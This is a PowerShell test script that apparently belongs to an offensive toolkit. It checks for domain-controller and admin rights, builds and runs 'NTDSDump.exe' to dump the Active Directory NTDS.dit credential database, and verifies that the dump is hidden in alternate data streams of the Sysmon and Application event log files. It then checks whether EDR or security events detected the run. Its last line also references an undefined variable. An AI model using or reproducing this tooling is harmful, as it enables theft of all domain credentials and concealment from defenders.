# run_test.ps1 — Test script for Plan 4: NTDS.dit Dump
# Target: T1003.003 | Pre-condition: SYSTEM on Domain Controller

param(
    [switch]$Fallback,
    [switch]$SkipDetect,
    [string]$OutFile = "ntds_output.bin"
)

$ErrorActionPreference = "Continue"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ToolDir   = Split-Path -Parent $ScriptDir
$ToolPath  = Join-Path $ToolDir "NTDSDump.exe"

Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  NTDS.dit Dump Test — T1003.003" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

# ─── Test 1: Environment Check ───
Write-Host "[Test 1/6] Environment Check" -ForegroundColor Yellow

# Check OS
$os = Get-CimInstance Win32_OperatingSystem
Write-Host "  OS: $($os.Caption) (Build $($os.BuildNumber))"

# Check if Domain Controller
$isDC = $false
try {
    $computer = Get-ADComputer -Identity $env:COMPUTERNAME -ErrorAction Stop
    $dcs = Get-ADDomainController -Filter * | Where-Object { $_.Name -eq $env:COMPUTERNAME }
    if ($dcs) { $isDC = $true }
} catch {
    # AD module not available, check via registry
    $dcReg = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\ProductOptions" -Name "ProductType" -EA SilentlyContinue
    if ($dcReg.ProductType -eq "LanmanNT") {
        # Could be DC — check for NTDS service
        $ntdsSvc = Get-Service -Name "NTDS" -EA SilentlyContinue
        if ($ntdsSvc) { $isDC = $true }
    }
}

if (-not $isDC) {
    Write-Host "  [!] WARNING: This machine does not appear to be a Domain Controller" -ForegroundColor Red
    Write-Host "  [!] NTDS.dit is only present on Domain Controllers" -ForegroundColor Red
}

# Check privilege
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "  [!] WARNING: Not running as Administrator. SYSTEM required for NTDS dump." -ForegroundColor Red
}

# Check NTDS.dit path
$ntdsPath = "$env:SystemRoot\NTDS\ntds.dit"
if (Test-Path $ntdsPath) {
    $ntdsSize = (Get-Item $ntdsPath).Length
    Write-Host "  NTDS.dit: $ntdsPath ($([math]::Round($ntdsSize/1MB, 2)) MB)" -ForegroundColor Green
} else {
    Write-Host "  [!] NTDS.dit not found at default path" -ForegroundColor Yellow
}

Write-Host ""

# ─── Test 2: Build Check ───
Write-Host "[Test 2/6] Build Check" -ForegroundColor Yellow

if (-not (Test-Path $ToolPath)) {
    Write-Host "  [!] NTDSDump.exe not found. Building..." -ForegroundColor Yellow
    Push-Location $ToolDir
    & cmd.exe /c "build.bat"
    Pop-Location
}

if (Test-Path $ToolPath) {
    $toolSize = (Get-Item $ToolPath).Length
    Write-Host "  Tool: $ToolPath ($([math]::Round($toolSize/1KB, 1)) KB)" -ForegroundColor Green
} else {
    Write-Host "  [ERR] Build failed — cannot run tests" -ForegroundColor Red
    exit 1
}

Write-Host ""

# ─── Test 3: EDR Detection Check ───
if (-not $SkipDetect) {
    Write-Host "[Test 3/6] EDR Detection Check" -ForegroundColor Yellow
    & "$ScriptDir\detect_check.ps1"
    Write-Host ""
} else {
    Write-Host "[Test 3/6] EDR Detection Check — SKIPPED" -ForegroundColor Yellow
    Write-Host ""
}

# ─── Test 4: Run NTDS Dump ───
Write-Host "[Test 4/6] Run NTDS Dump" -ForegroundColor Yellow

$args = @()
if ($Fallback) {
    $args += "--fallback"
    Write-Host "  Mode: NTDSUtil Fallback" -ForegroundColor Yellow
} else {
    Write-Host "  Mode: Raw NTFS" -ForegroundColor Yellow
}

$startTime = Get-Date
try {
    $output = & $ToolPath $args 2>&1
    $exitCode = $LASTEXITCODE
} catch {
    Write-Host "  [ERR] Tool execution failed: $_" -ForegroundColor Red
    $exitCode = -1
}
$endTime = Get-Date
$duration = ($endTime - $startTime).TotalSeconds

Write-Host "  Duration: $([math]::Round($duration, 1))s" -ForegroundColor Cyan
Write-Host "  Exit code: $exitCode"

# Show output
if ($output) {
    Write-Host "`n  --- Tool Output ---" -ForegroundColor DarkGray
    $output | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }
    Write-Host "  --- End Output ---`n" -ForegroundColor DarkGray
}

if ($exitCode -ne 0) {
    Write-Host "  [WARN] Tool exited with code $exitCode" -ForegroundColor Yellow
}

Write-Host ""

# ─── Test 5: Verify Output ───
Write-Host "[Test 5/6] Verify Output" -ForegroundColor Yellow

# Check for ADS output
$adsTargets = @(
    "$env:SystemRoot\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx",
    "$env:SystemRoot\System32\winevt\Logs\Application.evtx",
    "$env:SystemRoot\System32\LogFiles\HTTPERR\httperr1.log"
)

$adsFound = $false
foreach ($target in $adsTargets) {
    $adsPath = "$target`:NTDS"
    try {
        $adsContent = Get-Content -Path $adsPath -Raw -EA SilentlyContinue
        if ($adsContent) {
            Write-Host "  ADS Found: $adsPath ($($adsContent.Length) bytes)" -ForegroundColor Green
            $adsFound = $true
            break
        }
    } catch {}
}

if (-not $adsFound) {
    # Try with Get-Item
    foreach ($target in $adsTargets) {
        $adsPath = "$target`:NTDS"
        try {
            $item = Get-Item -Path $adsPath -EA SilentlyContinue
            if ($item) {
                Write-Host "  ADS Found: $adsPath" -ForegroundColor Green
                $adsFound = $true
                break
            }
        } catch {}
    }
}

if (-not $adsFound) {
    Write-Host "  [!] No ADS output detected — check tool output for errors" -ForegroundColor Yellow
    Write-Host "  [i] ADS paths checked:" -ForegroundColor DarkGray
    foreach ($target in $adsTargets) { Write-Host "      $target" -ForegroundColor DarkGray }
}

Write-Host ""

# ─── Test 6: EDR Alert Check ───
Write-Host "[Test 6/6] Post-Run EDR Alert Check" -ForegroundColor Yellow

$alertCheckInterval = 2  # seconds to wait for alerts to fire
Write-Host "  Waiting ${alertCheckInterval}s for EDR events..."
Start-Sleep -Seconds $alertCheckInterval

if (-not $SkipDetect) {
    # Quick check for recent security events
    $recentEvents = Get-WinEvent -LogName Security -MaxEvents 100 -EA SilentlyContinue |
        Where-Object { $_.TimeCreated -gt $startTime }
    $suspiciousEvents = $recentEvents |
        Where-Object { $_.Id -in @(4663, 4656, 4688, 5156, 5158) }
    if ($suspiciousEvents) {
        Write-Host "  [!] $($suspiciousEvents.Count) suspicious security events detected" -ForegroundColor Yellow
        $suspiciousEvents | Select-Object Id, TimeCreated, Message -First 5 |
            ForEach-Object { Write-Host "      Event $($_.Id) @ $($_.TimeCreated)" -ForegroundColor DarkGray }
    } else {
        Write-Host "  No suspicious security events" -ForegroundColor Green
    }
} else {
    Write-Host "  Skipped" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  Test Complete" -ForegroundColor Cyan
Write-Host "  Result: $adsFound_output_found ADS output" -ForegroundColor $(if ($adsFound) { "Green" } else { "Yellow" })
Write-Host "============================================================" -ForegroundColor Cyan
